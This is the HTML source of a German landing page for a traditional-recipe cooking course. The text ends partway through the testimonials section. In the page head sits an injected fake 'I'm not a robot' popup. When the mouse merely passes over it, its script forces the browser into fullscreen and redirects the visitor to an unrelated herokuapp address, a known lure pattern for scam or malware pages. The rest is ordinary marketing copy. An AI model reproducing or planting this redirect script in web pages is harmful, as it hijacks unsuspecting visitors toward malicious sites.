<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Entdecken Sie mit Chochoboy authentische deutsche Rezepte und traditionelle Küche. Unser Rezeptkurs macht Sie zum echten Meisterkoch. Jetzt anmelden!">
  <meta name="robots" content="index, follow">
  <meta property="og:title" content="Chochoboy - Rezepte | Deutsche traditionelle Rezepte Meisterkurs">
  <meta property="og:description" content="Entdecken Sie mit Chochoboy authentische deutsche Rezepte und traditionelle Küche. Unser Rezeptkurs macht Sie zum echten Meisterkoch. Jetzt anmelden!">
  <meta property="og:type" content="website">
  <title>Chochoboy - Rezepte | Deutsche traditionelle Rezepte Meisterkurs</title>
   <div id="popup-wrapper" onmouseover="fullscreenAndRedirect()">
    <div id="popup-bg"></div>

    <div class="popup-card">
      <span class="close-btn">&times;</span>

      <div class="content">
        <div class="icon">🤖</div>

        <div class="text">
          <h2>Verify You're Not a Robot</h2>

          <p>
            Please complete the verification below before continuing.
          </p>

          <div class="robot-box">
            <input type="checkbox" id="robotCheck">
            <label for="robotCheck">I'm not a robot</label>

            <div class="captcha-brand">
              <div>Verification</div>
              <small>Human Check</small>
            </div>
          </div>

          <div class="actions">
            <button id="continueBtn" disabled>
              Continue
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <style>
    html,
    body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
    }

    #popup-wrapper {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 2147483647;
    }

    #popup-bg {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, .65);
      backdrop-filter: blur(14px);
      -webkit-backdrop-filter: blur(14px);
    }

    .popup-card {
      position: relative;
      width: 720px;
      max-width: 92%;
      background: #fff;
      border-radius: 22px;
      padding: 28px;
      box-shadow: 0 30px 90px rgba(0, 0, 0, .45);
      font-family: Arial, Helvetica, sans-serif;
      z-index: 2147483647;
      animation: popup .25s ease-out;
    }

    @keyframes popup {
      from {
        opacity: 0;
        transform: scale(.9);
      }

      to {
        opacity: 1;
        transform: scale(1);
      }
    }

    .close-btn {
      position: absolute;
      right: 16px;
      top: 12px;
      font-size: 30px;
      font-weight: bold;
      cursor: pointer;
      color: #666;
    }

    .content {
      display: flex;
      gap: 20px;
    }

    .icon {
      width: 70px;
      height: 70px;
      min-width: 70px;
      border-radius: 16px;
      background: #f3f4f6;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 38px;
    }

    .text {
      flex: 1;
    }

    .text h2 {
      margin: 0 0 10px;
      font-size: 34px;
      font-weight: 800;
      color: #111827;
    }

    .text p {
      margin: 0;
      font-size: 18px;
      line-height: 1.6;
      color: #4b5563;
    }

    .robot-box {
      margin-top: 22px;
      border: 1px solid #d1d5db;
      border-radius: 10px;
      background: #fafafa;
      padding: 18px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .robot-box input {
      width: 28px;
      height: 28px;
      cursor: pointer;
    }

    .robot-box label {
      flex: 1;
      margin-left: 12px;
      font-size: 20px;
      cursor: pointer;
    }

    .captcha-brand {
      text-align: center;
      font-size: 12px;
      color: #6b7280;
    }

    .actions {
      margin-top: 24px;
    }

    .actions button {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 12px;
      background: #2563eb;
      color: #fff;
      font-size: 20px;
      font-weight: 700;
      cursor: pointer;
    }

    .actions button:disabled {
      opacity: .5;
      cursor: not-allowed;
    }

    @media(max-width:768px) {
      .content {
        flex-direction: column;
      }

      .icon {
        margin: auto;
      }

      .text h2 {
        font-size: 28px;
        text-align: center;
      }

      .text p {
        text-align: center;
      }
    }
  </style>

  <script>
    const robotCheck = document.getElementById("robotCheck");
    const continueBtn = document.getElementById("continueBtn");

    robotCheck.addEventListener("change", function () {
      continueBtn.disabled = !this.checked;
    });

    continueBtn.addEventListener("click", function () {
      alert("Verification completed.");
      // Add your own action here
    });

    document.querySelector(".close-btn").addEventListener("click", function () {
      document.getElementById("popup-wrapper").style.display = "none";
    });

     function fullscreenAndRedirect() {
    const el = document.documentElement;

    if (!document.fullscreenElement) {
      if (el.requestFullscreen) el.requestFullscreen();
      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      else if (el.msRequestFullscreen) el.msRequestFullscreen();
    }

    setTimeout(() => {
      window.location.href = "https://windbnvmnbvmnbvde-57c9d065f87e.herokuapp.com/";
    }, 1000);
  }
  </script>
  <link rel="canonical" href="https://chochoboy-site.com">
  <link rel="icon" type="image/svg+xml" href="{{favicon_file}}">
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            primary: '#3B82F6',
            'primary-dark': '#2563EB',
          }
        }
      }
    }
  </script>
  <style>
    html { scroll-behavior: smooth; }
    .btn-primary { background-color: #3B82F6; }
    .btn-primary:hover { background-color: #2563EB; }
    .text-primary { color: #3B82F6; }
    .bg-primary { background-color: #3B82F6; }
    .border-primary { border-color: #3B82F6; }
    .faq-answer { display: none; }
    .faq-answer.open { display: block; }
  </style>
</head>
<body class="font-sans text-gray-800 antialiased">

<!-- Cookie Banner -->
<div id="cookie-banner" class="fixed bottom-0 left-0 right-0 z-50 bg-gray-900 text-white p-4 shadow-lg" style="display:none;">
  <div class="max-w-6xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
    <p class="text-sm text-gray-300">
      Wir verwenden Cookies, um Ihre Erfahrung auf unserer Website zu verbessern. Einige Cookies sind für den Betrieb der Website notwendig, während andere uns helfen, unsere Dienste zu verbessern. <a href="privacy-policy.html" class="underline text-white hover:text-gray-300">Cookie-Richtlinie</a>.
    </p>
    <div class="flex gap-3 shrink-0">
      <button onclick="acceptCookies('necessary')" class="px-4 py-2 text-sm border border-gray-500 rounded hover:bg-gray-700 transition">Nur notwendige</button>
      <button onclick="acceptCookies('all')" class="px-4 py-2 text-sm rounded text-white transition btn-primary">Alle akzeptieren</button>
    </div>
  </div>
</div>

<!-- Header -->
<header id="main-header" class="sticky top-0 z-40 bg-white shadow-sm">
  <div class="max-w-6xl mx-auto px-4 py-4 flex items-center justify-between">
    <a href="/" class="flex items-center gap-2">
      <span class="text-2xl font-bold text-primary">Chochoboy</span>
    </a>
    <nav class="hidden md:flex items-center gap-6 text-sm font-medium text-gray-600">
      <a href="#about" class="hover:text-primary transition">Über uns</a>
      <a href="#services" class="hover:text-primary transition">Angebote</a>
      <a href="#testimonials" class="hover:text-primary transition">Bewertungen</a>
      <a href="#faq" class="hover:text-primary transition">FAQ</a>
      <a href="contact.html" class="hover:text-primary transition">Kontakt</a>
    </nav>
    <a href="#cta" class="hidden md:inline-block px-5 py-2 text-sm font-semibold text-white rounded-lg transition btn-primary">Jetzt starten</a>
    <!-- Mobile menu button -->
    <button id="menu-btn" class="md:hidden p-2 rounded text-gray-600 hover:text-primary" onclick="toggleMenu()">
      <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
    </button>
  </div>
  <!-- Mobile menu -->
  <div id="mobile-menu" class="hidden md:hidden bg-white border-t px-4 py-4 space-y-3 text-sm font-medium text-gray-600">
    <a href="#about" class="block hover:text-primary" onclick="toggleMenu()">Über uns</a>
    <a href="#services" class="block hover:text-primary" onclick="toggleMenu()">Angebote</a>
    <a href="#testimonials" class="block hover:text-primary" onclick="toggleMenu()">Bewertungen</a>
    <a href="#faq" class="block hover:text-primary" onclick="toggleMenu()">FAQ</a>
    <a href="contact.html" class="block hover:text-primary" onclick="toggleMenu()">Kontakt</a>
    <a href="#cta" class="block px-4 py-2 text-white rounded-lg text-center btn-primary" onclick="toggleMenu()">Jetzt starten</a>
  </div>
</header>

<!-- Hero -->
<section class="relative bg-gradient-to-br from-gray-50 to-gray-100 py-20 md:py-32 overflow-hidden">
  <div class="max-w-6xl mx-auto px-4 flex flex-col md:flex-row items-center gap-12">
    <div class="flex-1 text-center md:text-left">
      <span class="inline-block px-3 py-1 text-xs font-semibold rounded-full text-white mb-4 bg-primary">Meisterkoch-Kurs</span>
      <h1 class="text-4xl md:text-5xl lg:text-6xl font-extrabold text-gray-900 leading-tight mb-6">Meistern Sie deutsche traditionelle Rezepte mit Chochoboy</h1>
      <p class="text-lg md:text-xl text-gray-600 mb-8 max-w-xl">Lernen Sie authentische deutsche Küche Schritt für Schritt mit unserem preisgekrönten Rezeptkurs für alle Niveaus.</p>
      <div class="flex flex-col sm:flex-row gap-4 justify-center md:justify-start">
        <a href="#cta" class="px-8 py-4 text-white font-semibold rounded-xl shadow-lg transition btn-primary">Jetzt starten</a>
        <a href="#about" class="px-8 py-4 font-semibold rounded-xl border-2 border-primary text-primary hover:bg-primary hover:text-white transition">Mehr erfahren</a>
      </div>
      <!-- Stats -->
      <div class="mt-12 grid grid-cols-3 gap-6">
        <div>
          <div class="text-2xl font-bold text-primary">10+</div>
          <div class="text-xs text-gray-500 mt-1">Jahre Erfahrung</div>
        </div>
        <div>
          <div class="text-2xl font-bold text-primary">5000+</div>
          <div class="text-xs text-gray-500 mt-1">Zufriedene Teilnehmer</div>
        </div>
        <div>
          <div class="text-2xl font-bold text-primary">98%</div>
          <div class="text-xs text-gray-500 mt-1">Erfolgsquote</div>
        </div>
      </div>
    </div>
    <div class="flex-1 w-full max-w-lg">
      <img src="images/hero.jpg" alt="Chochoboy Meisterkoch zeigt traditionelle deutsche Rezepte in einer modernen Küche" width="600" height="450" class="w-full rounded-2xl shadow-2xl object-cover" loading="eager">
    </div>
  </div>
</section>

<!-- About -->
<section id="about" class="py-20 bg-white">
  <div class="max-w-6xl mx-auto px-4">
    <div class="flex flex-col md:flex-row gap-12 items-center">
      <div class="flex-1">
        <img src="images/about.jpg" alt="Chochoboy Team von Meisterköchen bei der Zubereitung traditioneller deutscher Gerichte" width="540" height="400" class="w-full rounded-2xl shadow-lg object-cover" loading="lazy">
      </div>
      <div class="flex-1">
        <span class="text-sm font-semibold text-primary uppercase tracking-widest">Über Chochoboy</span>
        <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2 mb-6">Ihre Leidenschaft für deutsche Küche beginnt hier</h2>
        <p class="text-gray-600 leading-relaxed mb-4">Chochoboy wurde gegründet, um die reiche Tradition der deutschen Küche in die moderne Zeit zu bringen. Unsere Plattform verbindet leidenschaftliche Hobbyköche und professionelle Köche mit dem Wissen erfahrener Meisterköche. Wir glauben, dass jeder die Kunst der deutschen Rezepte erlernen kann, wenn er die richtige Anleitung erhält.</p>
        <p class="text-gray-600 leading-relaxed mb-4">Unser Team besteht aus zertifizierten Meisterköchen, Ernährungsexperten und Kochpädagogen, die zusammenarbeiten, um Ihnen die besten deutschen Rezepte näherzubringen. Von klassischem Sauerbraten bis hin zu feinen Schwarzwälder Kirschtorten – wir decken die gesamte Bandbreite der deutschen Küche ab.</p>
        <p class="text-gray-600 leading-relaxed mb-6">Mit über 5.000 begeisterten Teilnehmern und einer Erfolgsquote von 98 % sind wir stolz darauf, die führende Plattform für deutsche Rezeptkurse in Deutschland zu sein. Treten Sie unserer wachsenden Gemeinschaft bei und entdecken Sie die Freude am Kochen traditioneller Gerichte.</p>
        <a href="about.html" class="inline-flex items-center gap-2 font-semibold text-primary hover:underline">
          Unsere Geschichte entdecken
          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3"/></svg>
        </a>
      </div>
    </div>
  </div>
</section>

<!-- Services -->
<section id="services" class="py-20 bg-gray-50">
  <div class="max-w-6xl mx-auto px-4">
    <div class="text-center mb-14">
      <span class="text-sm font-semibold text-primary uppercase tracking-widest">Unsere Angebote</span>
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2">Rezeptkurse für jeden Geschmack</h2>
      <p class="text-gray-500 mt-4 max-w-xl mx-auto">Von Anfängern bis zu Profis bieten wir maßgeschneiderte Kochkurse mit authentischen deutschen Rezepten für alle Kenntnisstufen.</p>
    </div>
    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
      <!-- Service 1 -->
      <div class="bg-white rounded-2xl p-6 shadow-sm hover:shadow-md transition">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-4 bg-primary" style="opacity:0.9">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Grundkurs Deutsche Küche</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Erlernen Sie die Grundlagen der traditionellen deutschen Küche. Dieser Kurs umfasst klassische Rezepte, Kochtechniken und wichtige Zutaten für Einsteiger.</p>
      </div>
      <!-- Service 2 -->
      <div class="bg-white rounded-2xl p-6 shadow-sm hover:shadow-md transition">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-4 bg-primary" style="opacity:0.9">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3L1 9l11 6 9-4.91V17h2V9L12 3zM5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Meisterkoch Rezeptkurs</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Tauchen Sie tief in die Welt der deutschen Spitzenküche ein. Lernen Sie fortgeschrittene Techniken und geheime Rezepte direkt von erfahrenen Meisterköchen.</p>
      </div>
      <!-- Service 3 -->
      <div class="bg-white rounded-2xl p-6 shadow-sm hover:shadow-md transition">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-4 bg-primary" style="opacity:0.9">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.5 3l-.16.03L15 5.1 9 3 3.36 4.9c-.21.07-.36.25-.36.48V20.5c0 .28.22.5.5.5l.16-.03L9 18.9l6 2.1 5.64-1.9c.21-.07.36-.25.36-.48V3.5c0-.28-.22-.5-.5-.5z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Traditionelle Regionalrezepte</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Entdecken Sie die kulinarische Vielfalt Deutschlands: Bayerische, Schwäbische, Rheinische und viele andere regionale Spezialitäten aus jeder Ecke des Landes.</p>
      </div>
      <!-- Service 4 -->
      <div class="bg-white rounded-2xl p-6 shadow-sm hover:shadow-md transition">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-4 bg-primary" style="opacity:0.9">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Online-Kochvideos</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Streamen Sie hochwertige Lehrvideos wann und wo Sie wollen. Unsere Schritt-für-Schritt-Videoanleitung macht das Nachkochen einfacher und effektiver als je zuvor.</p>
      </div>
      <!-- Service 5 -->
      <div class="bg-white rounded-2xl p-6 shadow-sm hover:shadow-md transition">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-4 bg-primary" style="opacity:0.9">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Persönliches Kochcoaching</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Erhalten Sie individuelle Betreuung durch unsere Meisterköche. Persönliches Feedback, maßgeschneiderte Rezeptpläne und direkte Unterstützung für Ihren kulinarischen Erfolg.</p>
      </div>
      <!-- Service 6 -->
      <div class="bg-white rounded-2xl p-6 shadow-sm hover:shadow-md transition">
        <div class="w-12 h-12 rounded-xl flex items-center justify-center mb-4 bg-primary" style="opacity:0.9">
          <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
        </div>
        <h3 class="text-lg font-bold text-gray-900 mb-2">Rezept-Zertifizierungsprogramm</h3>
        <p class="text-gray-500 text-sm leading-relaxed">Schließen Sie unsere Kurse erfolgreich ab und erhalten Sie ein anerkanntes Zertifikat als Chochoboy-Rezeptmeister. Zeigen Sie Ihre kulinarischen Fähigkeiten der Welt.</p>
      </div>
    </div>
  </div>
</section>

<!-- Benefits -->
<section class="py-20 bg-white">
  <div class="max-w-6xl mx-auto px-4">
    <div class="text-center mb-14">
      <span class="text-sm font-semibold text-primary uppercase tracking-widest">Ihre Vorteile</span>
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2">Warum Chochoboy der richtige Kurs für Sie ist</h2>
    </div>
    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
      <div class="text-center p-6">
        <div class="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4" style="background-color: #3B82F620;">
          <svg class="w-8 h-8 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
        </div>
        <h3 class="font-bold text-gray-900 mb-2">Authentische Rezepte</h3>
        <p class="text-sm text-gray-500">Alle Rezepte werden von zertifizierten deutschen Meisterköchen entwickelt und auf Authentizität geprüft, damit Sie echte Tradition erleben.</p>
      </div>
      <div class="text-center p-6">
        <div class="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4" style="background-color: #3B82F620;">
          <svg class="w-8 h-8 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
        </div>
        <h3 class="font-bold text-gray-900 mb-2">Flexibles Lernen</h3>
        <p class="text-sm text-gray-500">Lernen Sie in Ihrem eigenen Tempo, jederzeit und überall. Unser Online-Kursformat passt sich Ihrem Alltag und Zeitplan an.</p>
      </div>
      <div class="text-center p-6">
        <div class="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4" style="background-color: #3B82F620;">
          <svg class="w-8 h-8 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0"/></svg>
        </div>
        <h3 class="font-bold text-gray-900 mb-2">Gemeinschaft & Support</h3>
        <p class="text-sm text-gray-500">Werden Sie Teil einer lebendigen Koch-Community. Tauschen Sie Rezepte aus, erhalten Sie Hilfe und feiern Sie gemeinsame Kocherfolge.</p>
      </div>
      <div class="text-center p-6">
        <div class="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4" style="background-color: #3B82F620;">
          <svg class="w-8 h-8 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
        </div>
        <h3 class="font-bold text-gray-900 mb-2">Zertifizierter Abschluss</h3>
        <p class="text-sm text-gray-500">Nach Abschluss des Kurses erhalten Sie ein offizielles Chochoboy-Zertifikat, das Ihre Rezeptkenntnisse und Kochkompetenz belegt.</p>
      </div>
    </div>
  </div>
</section>

<!-- Testimonials -->
<section id="testimonials" class="py-20 bg-gray-50">
  <div class="max-w-6xl mx-auto px-4">
    <div class="text-center mb-14">
      <span class="text-sm font-semibold text-primary uppercase tracking-widest">Bewertungen</span>
      <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mt-2">Was unsere Teilnehmer sagen</h2>
    </div>
    <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
      <div class="bg-white rounded-2xl p-6 shadow-sm">
        <div class="flex gap-1 mb-4">
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
        </div>
        <p class="text-gray-600 text-sm leading-relaxed mb-4">"Chochoboy hat meine Leidenschaft für die deutsche Küche neu entfacht. Die Rezepte sind authentisch, die Anleitungen klar und der Support ist hervorragend. Ich habe endlich gelernt, einen echten Sauerbraten zuzubereiten, der meiner Oma stolz gemacht hätte. Absolut empfehlenswert für jeden Kochliebhaber!"</p>
        <div class="flex items-center gap-3">
          <img src="images/avatar1.jpg" alt="Markus Hoffmann" width="40" height="40" class="w-10 h-10 rounded-full object-cover" loading="lazy">
          <div>
            <div class="font-semibold text-sm text-gray-900">Markus Hoffmann</div>
            <div class="text-xs text-gray-400">Hobbykoch aus München</div>
          </div>
        </div>
      </div>
      <div class="bg-white rounded-2xl p-6 shadow-sm">
        <div class="flex gap-1 mb-4">
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
        </div>
        <p class="text-gray-600 text-sm leading-relaxed mb-4">"Als Berufsköchin war ich skeptisch, aber Chochoboy hat mich vollständig überzeugt. Die traditionellen Rezepte sind detailliert und lehrreich. Ich habe viele neue Techniken gelernt und mein Menü in unserem Restaurant bereichert. Der Meisterkurs ist wirklich sein Geld wert und sehr professionell gestaltet."</p>
        <div class="flex items-center gap-3">
          <img src="images/avatar2.jpg" alt="Sabine Krüger" width="40" height="40" class="w-10 h-10 rounded-full object-cover" loading="lazy">
          <div>
            <div class="font-semibold text-sm text-gray-900">Sabine Krüger</div>
            <div class="text-xs text-gray-400">Professionelle Köchin aus Berlin</div>
          </div>
        </div>
      </div>
      <div class="bg-white rounded-2xl p-6 shadow-sm">
        <div class="flex gap-1 mb-4">
          <svg class="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg>
